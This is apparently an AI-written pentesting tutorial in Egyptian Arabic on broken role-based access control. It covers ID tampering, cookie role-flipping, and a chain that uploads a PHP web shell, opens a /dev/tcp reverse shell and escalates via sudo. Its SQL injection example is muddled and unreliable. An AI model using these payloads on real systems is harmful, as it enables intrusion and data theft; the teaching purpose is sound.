تمام، هشرح لك "Improper Role-Based Access Control (RBAC)" بعمق شديد، مع تركيز على الجانب العميق والعملي، الأوامر، والأكواد. هخلّص كل جزء بالعامية المصرية زي ما تكون بتسمع من صاحبك، وفي الآخر هقدم خطوات عملية للاستغلال في سياق Pentesting.

---

### **1. إيه هو Improper Role-Based Access Control (RBAC)؟**

#### **الشرح العميق:**
"Role-Based Access Control" (RBAC) هو نظام تحكم في الوصول بيعتمد على "الأدوار" (Roles) اللي بيتم تعيينها للمستخدمين في تطبيق أو نظام. يعني كل مستخدم عنده دور معين (زي User، Editor، Admin)، والدور ده بيحدد إيه اللي يقدر يعمله وإيه اللي مش مسموح بيه. لما نقول "Improper RBAC"، يعني إن النظام ده معمول بشكل غلط أو ضعيف، فالمستخدم يقدر يعمل حاجات خارج دوره، زي إن مستخدم عادي يشوف بيانات الأدمن أو يعدل حاجة المفروض للأدمن بس. ده بيحصل بسبب:
- سوء تصميم الصلاحيات.
- عدم التحقق من دور المستخدم قبل تنفيذ أمر.
- إعطاء صلاحيات زيادة عن اللزوم.

#### **الأدوات والأوامر العملية:**
1. **فحص الوصول في الويب:**
   - لو موقع فيه حساب User عادي:
     - جرب رابط زي: `http://target.com/api/users/123`.
     - عدل الـ ID لـ `124` أو `1` -> لو فتح حساب حد تاني، يبقى RBAC ضعيف.

2. **اختبار الأدوار:**
   - لو عندك حساب User، جرب صفحة Admin:
     - `http://target.com/admin/dashboard` -> لو فتحت، يعني مافيش تحقق من الدور.

3. **فحص الـ API:**
   - استخدم Burp Suite:
     - Intercept طلب زي `GET /api/settings` -> لو رجع بيانات لمستخدم عادي، يبقى Improper RBAC.

#### **خلاصة بالعامية المصرية:**
"يعني زي ما تكون حاطط ناس في أوض مختلفة في البيت، بس سايب الأبواب مفتوحة، فالكل يقدر يخش أي حتة! Improper RBAC يعني كل واحد يعمل اللي عايزه من غير ما حد يقوله لأ."

---

### **2. ليه المشكلة دي خطيرة؟**

#### **الشرح العميق:**
لما RBAC يكون ضعيف أو مضبوط غلط، بيفتح الباب للمهاجم يعمل حاجات خطيرة:
- **تصعيد أفقي (Horizontal):** مستخدم عادي يشوف أو يعدل بيانات مستخدم تاني.
- **تصعيد عمودي (Vertical):** مستخدم عادي يوصل لصلاحيات Admin أو يتحكم في النظام.
- **سرقة بيانات:** ياخد معلومات المفروض تكون لأدوار أعلى بس.
- **تخريب:** يغير إعدادات أو يمسح حاجات مهمة.

في الـ Pentesting، الثغرة دي ذهب لأنها بتخليك تتخطى حدود دورك وتصير الكبير بدون ما تحتاج مجهود كبير.

#### **الأدوات والأوامر العملية:**
1. **استغلال الـ API:**
   - لو لقيت طلب زي `POST /api/update_user` بتاعك كـ User:
     - غير الـ Payload في Burp:
       - `"user_id": 123` لـ `"user_id": 1` -> لو نجح، يبقى RBAC مكسور.

2. **تجاوز التحقق:**
   - لو موقع بيستخدم Cookie زي `role=user`:
     - غيرها في المتصفح لـ `role=admin` -> لو فتحت صفحة Admin، يبقى ضعيف.

3. **SQL Injection مع RBAC:**
   - `http://target.com/profile?id=123; SELECT * FROM users WHERE role='admin' --` -> لو جاب بيانات Admin، يبقى مافيش حماية.

#### **خلاصة بالعامية المصرية:**
"المشكلة خطيرة لأنها زي ما تكون حاطط حارس بس نايم، أي حد يقدر يعدي وياخد اللي عايزه! المهاجم يلاقي الثغرة دي، يبقى الباشا بتاع الموقع على طول."

---

### **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الضعف في RBAC عشان تتجاوز حدود دورك وتاخد وصول أعلى أو تتحكم في حاجات ممنوعة.
- **مثال واقعي:** لو مستخدم عادي قدر يعدل بيانات الأدمن بتغيير الـ ID في الرابط، يبقى RBAC مضروب.

#### **خلاصة بالعامية المصرية:**
"لما تلاقي RBAC ضعيف، زي ما تكون لقيت خرم في الحيطة، تدخل منه وتبقى الكبير بتاع اللعبة من غير ما حد يحس!"

---

### **خطوات عملية للاستغلال في Pentesting**

#### **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29.

#### **الخطوة 2: إنشاء حساب User**
- لو الموقع بيسمح، سجل حساب عادي:
  - Username: `testuser` - Password: `test123`.
- سجل دخول وشوف حدودك.

#### **الخطوة 3: اختبار RBAC**
- جرب تغير الـ ID:
  - `http://192.168.1.10/profile?id=100` (حسابك).
  - `http://192.168.1.10/profile?id=1` -> لو فتح حساب الأدمن، يبقى RBAC ضعيف.
- جرب صفحات Admin:
  - `http://192.168.1.10/admin` -> لو فتحت بدون تحقق، يبقى مكشوف.

#### **الخطوة 4: استغلال أفقي**
- لو لقيت API:
  - Intercept بـ Burp: `GET /api/users/100`.
  - غيرها لـ `GET /api/users/1` -> لو جاب بيانات الأدمن، سجلها.

#### **الخطوة 5: استغلال عمودي**
- لو لقيت Cookie زي `role=user`:
  - غيرها في المتصفح لـ `role=admin`.
  - افتح: `http://192.168.1.10/admin/settings` -> لو نجحت:
    - ابحث عن Upload -> ارفع `shell.php`: `<?php system($_GET['cmd']); ?>`.
    - `http://192.168.1.10/admin/shell.php?cmd=id` -> `www-data`.

#### **الخطوة 6: تصعيد الصلاحيات**
- من الـ Shell:
  - `http://192.168.1.10/admin/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell.
  - `id` -> `www-data` -> `sudo -l` -> لو لقيت `sudo /bin/bash`، نفذه -> `root`.

#### **الخطوة 7: توثيق**
- سجل كل اللي وصلتله (زي بيانات الأدمن أو Shell).
- قدم تقرير يوضح إزاي RBAC الضعيف فتح الباب للتحكم.

#### **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت بيت الأدوار فيه مفتوحة، خشيت من أوضة صغيرة، لعبته في الكبيرة، وطلعت الكبير بتاع الحتة! RBAC لما يكون ضعيف، يبقى طريقك للفوز بسهولة."

---

### **الخلاصة النهائية:**
Improper Role-Based Access Control هي ثغرة كبيرة لأنها بتخلّي المستخدم يتجاوز دوره ويوصل لأماكن أو صلاحيات المفروض ممنوعة. في الـ Pentesting، دور على الضعف ده في الروابط، الـ API، أو الكوكيز، استغله عشان تاخد بيانات أو Shell، ووري العميل إن نظامه زي لعبة مفتوحة للكل! بالطريقة دي، تبقى البطل بتاع الساحة بكل سهولة!